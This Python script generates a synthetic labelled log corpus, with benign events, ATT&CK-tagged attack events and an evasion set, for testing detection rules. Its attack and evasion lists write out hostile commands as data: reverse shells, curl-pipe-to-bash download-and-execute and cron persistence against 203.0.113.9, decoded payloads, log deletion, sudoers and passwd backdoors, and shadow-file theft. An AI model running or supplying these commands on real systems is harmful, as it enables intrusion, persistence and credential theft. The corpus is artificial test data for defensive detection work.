"""Corpus generator: benign baseline + labelled attack sequences.

For a 4-day showcase we generate a *synthetic but realistic* corpus instead of
standing up an Atomic Red Team lab. Be explicit about this in the report and the
demo: it is a replay corpus, so recall numbers describe *this* corpus, not the
wild. Realism is preserved by copying the shape of real syslog/authd records.

Outputs:
    lab/corpus.jsonl      one JSON event per line (ground truth included)
    lab/ground_truth.json labels + technique per attack event
    data/baseline.json    statistics learned from the benign half only
"""
from __future__ import annotations

import argparse
import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

HOST = "web-01"
BENIGN_USERS = ["ubuntu", "deploy", "ops", "www-data"]
ATTACKER_IP = "203.0.113.9"
NORMAL_IPS = ["10.0.4.21", "10.0.4.22", "10.0.4.30"]

BENIGN_PROCS = [
    ("bash", "/bin/bash -lc ls -la /srv/app"),
    ("systemctl", "systemctl restart nginx"),
    ("apt-get", "apt-get update -y"),
    ("git", "git -C /srv/app pull origin main"),
    ("tail", "tail -n 200 /var/log/nginx/access.log"),
    ("ps", "ps aux --sort=-%mem"),
    ("df", "df -h"),
    ("python3", "python3 /srv/app/manage.py collectstatic --noinput"),
    ("cron", "/usr/sbin/cron -f"),
    ("nginx", "nginx: worker process"),
]

ATTACKS = [
    # (technique, label, events)
    ("T1110", "ssh brute force", [
        dict(event_type="auth", user=u, status="failure", message=f"Failed password for {u}")
        for u in ["root", "admin", "oracle", "postgres", "ubuntu", "root"]
    ]),
    ("T1078", "successful login after failures", [
        dict(event_type="auth", user="root", status="success", message="Accepted password for root")
    ]),
    ("T1136.001", "local account creation", [
        dict(event_type="process", user="root", process="useradd",
             cmdline="/usr/sbin/useradd -m -s /bin/bash svcbackup")
    ]),
    ("T1098.004", "ssh key injection", [
        dict(event_type="file", user="root", process="tee", path="/root/.ssh/authorized_keys",
             cmdline="echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 attacker@c2' >> /root/.ssh/authorized_keys")
    ]),
    ("T1053.003", "cron persistence", [
        dict(event_type="file", user="root", process="sh", path="/etc/cron.d/updater",
             cmdline="echo '* * * * * root curl -s http://203.0.113.9/u.sh | bash' > /etc/cron.d/updater")
    ]),
    ("T1059.004", "reverse shell", [
        dict(event_type="process", user="root", process="bash",
             cmdline="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")
    ]),
    ("T1140", "encoded payload execution", [
        dict(event_type="process", user="root", process="bash",
             cmdline="echo 'cHduZWQgLS1ub3cgY29udHJvbA==' | base64 -d | bash")
    ]),
    ("T1070.002", "log tampering", [
        dict(event_type="process", user="root", process="rm",
             cmdline="rm -rf /var/log/auth.log /var/log/syslog")
    ]),
    ("T1548.003", "sudoers modification", [
        dict(event_type="file", user="root", process="sh", path="/etc/sudoers",
             cmdline="echo 'svcbackup ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
    ]),
    ("T1003.008", "credential access", [
        dict(event_type="process", user="root", process="cat",
             cmdline="cat /etc/shadow > /tmp/hashes.txt")
    ]),
    ("T1190", "web exploitation attempt", [
        dict(event_type="http", user=None, process="nginx", path="/../../etc/passwd%00.png",
             src_ip="198.51.100.77", status="404", user_agent="sqlmap/1.7")
    ]),
    ("T1105", "download and execute", [
        dict(event_type="process", user="root", process="bash",
             cmdline="curl -s http://203.0.113.9/x.sh -o /tmp/x && chmod +x /tmp/x && /tmp/x")
    ]),
    ("T1560", "archive staging", [
        dict(event_type="process", user="root", process="tar",
             cmdline="tar -czf /tmp/loot.tgz /etc /home /root")
    ]),
]


def benign(n: int, start: datetime) -> list[dict]:
    rnd = random.Random(1337)
    out = []
    for i in range(n):
        proc, cmd = rnd.choice(BENIGN_PROCS)
        ts = start + timedelta(seconds=i * 3 + rnd.randint(0, 2))
        out.append({
            "ts": ts.isoformat(), "host": HOST, "user": rnd.choice(BENIGN_USERS),
            "event_type": "process", "process": proc, "cmdline": cmd,
            "src_ip": rnd.choice(NORMAL_IPS), "label": "benign",
        })
    # a few hundred benign auth events
    for i in range(n // 2):
        ts = start + timedelta(seconds=i * 7)
        out.append({
            "ts": ts.isoformat(), "host": HOST, "user": rnd.choice(BENIGN_USERS),
            "event_type": "auth", "status": rnd.choice(["success"] * 19 + ["failure"]),
            "src_ip": rnd.choice(NORMAL_IPS), "message": "Accepted publickey",
            "label": "benign",
        })
    return out


# Deliberately built to test the *limits* of the rule set. These are real
# evasions attackers use; the point is to measure what the rules miss rather
# than to produce a perfect score. Reported separately as an evasion set.
EVASIONS = [
    {"technique": "T1059.004", "name": "python reverse shell",
     "cmdline": "python3 -c 'import socket,subprocess,os;s=socket.socket();"
                "s.connect((\"203.0.113.9\",4444));os.dup2(s.fileno(),0);"
                "subprocess.call([\"/bin/sh\",\"-i\"])'"},
    {"technique": "T1070.002", "name": "in-place log truncation",
     "cmdline": ": > /var/log/auth.log", "path": "/var/log/auth.log"},
    {"technique": "T1136.001", "name": "direct /etc/passwd edit",
     "cmdline": "echo 'svcbackup:x:0:0::/root:/bin/bash' >> /etc/passwd",
     "path": "/etc/passwd"},
    {"technique": "T1053.003", "name": "systemd timer persistence",
     "cmdline": "systemctl enable --now evil.timer"},
    {"technique": "T1140", "name": "openssl-decoded payload",
     "cmdline": "openssl enc -d -aes-256-cbc -in /tmp/p.enc | sh"},
    {"technique": "T1098.004", "name": "key installed via python",
     "cmdline": "python3 -c \"open('/root/.ssh/authorized_keys','a').write('ssh-ed25519 AAA')\""},
]


def evasion_events(start: datetime) -> list[dict]:
    out = []
    t = start
    for e in EVASIONS:
        t = t + timedelta(seconds=120)
        out.append({
            "ts": t.isoformat(), "host": HOST, "user": "root",
            "event_type": "process", "process": (e["cmdline"].split()[0] if e["cmdline"] else None),
            "cmdline": e["cmdline"], "path": e.get("path"),
            "src_ip": ATTACKER_IP, "label": "evasion", "technique": e["technique"],
            "attack_name": e["name"],
        })
    return out


def attack(start: datetime, gap_seconds: int = 90) -> tuple[list[dict], list[dict]]:
    """One ground-truth *window per technique*, covering all of its events."""
    events, truth = [], []
    t = start
    for tech, name, evs in ATTACKS:
        t = t + timedelta(seconds=gap_seconds)
        w_start, w_end = t, t
        for j, e in enumerate(evs):
            ets = t + timedelta(seconds=j * 4)
            rec = {
                "ts": ets.isoformat(), "host": HOST, "user": e.get("user", "root"),
                "event_type": e["event_type"], "process": e.get("process"),
                "cmdline": e.get("cmdline"), "path": e.get("path"),
                "status": e.get("status"), "user_agent": e.get("user_agent"),
                "src_ip": e.get("src_ip", ATTACKER_IP),
                "message": e.get("message"), "label": "attack", "technique": tech,
                "attack_name": name,
            }
            events.append(rec)
            w_end = ets
        truth.append({"technique": tech, "name": name,
                      "ts": w_start.isoformat(),
                      "window_end": (w_end + timedelta(seconds=30)).isoformat(),
                      "events": len(evs)})
    return events, truth


def build_baseline(events: list[dict]) -> dict:
    """Statistics from BENIGN events only — no label leakage into the scorer."""
    proc_count: dict[str, int] = {}
    lens = []
    ips, users = set(), set()
    for e in events:
        if e.get("label") != "benign":
            continue
        p = (e.get("process") or "").lower()
        if p:
            proc_count[p] = proc_count.get(p, 0) + 1
        if e.get("cmdline"):
            lens.append(len(e["cmdline"]))
        if e.get("src_ip"):
            ips.add(e["src_ip"])
        if e.get("user"):
            users.add(e["user"])
    mean = sum(lens) / len(lens) if lens else 40.0
    var = sum((x - mean) ** 2 for x in lens) / len(lens) if lens else 625.0
    return {
        "process_count": proc_count,
        "mean_len": round(mean, 2),
        "std_len": round(max(var ** 0.5, 1.0), 2),
        "known_ips": sorted(ips),
        "known_users": sorted(users),
        "total": sum(proc_count.values()),
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--benign", type=int, default=400)
    ap.add_argument("--out", default="lab")
    ap.add_argument("--baseline-out", default="data/baseline.json")
    args = ap.parse_args()

    outdir = Path(args.out)
    outdir.mkdir(parents=True, exist_ok=True)
    start = datetime.now(UTC).replace(microsecond=0)

    b = benign(args.benign, start)
    a, truth = attack(start + timedelta(minutes=2))
    ev = evasion_events(start + timedelta(minutes=40))

    # interleave and sort, so detection order mirrors reality
    events = sorted(b + a + ev, key=lambda e: e["ts"])
    with open(outdir / "corpus.jsonl", "w") as fh:
        for e in events:
            fh.write(json.dumps(e) + "\n")
    with open(outdir / "ground_truth.json", "w") as fh:
        json.dump({"generated": start.isoformat(), "benign": len(b),
                   "attack_events": len(a), "evasion_events": len(ev),
                   "techniques": truth,
                   "evasions": [{k: e[k] for k in ("technique", "name", "cmdline")}
                                for e in EVASIONS]}, fh, indent=2)

    Path(args.baseline_out).parent.mkdir(parents=True, exist_ok=True)
    with open(args.baseline_out, "w") as fh:
        json.dump(build_baseline(b), fh, indent=2)

    print(f"corpus: {len(events)} events ({len(b)} benign, {len(a)} attack, {len(ev)} evasion) "
          f"→ {outdir/'corpus.jsonl'}")
    print(f"ground truth: {len(truth)} technique windows → {outdir/'ground_truth.json'}")
    print(f"baseline: {args.baseline_out}")


if __name__ == "__main__":
    main()
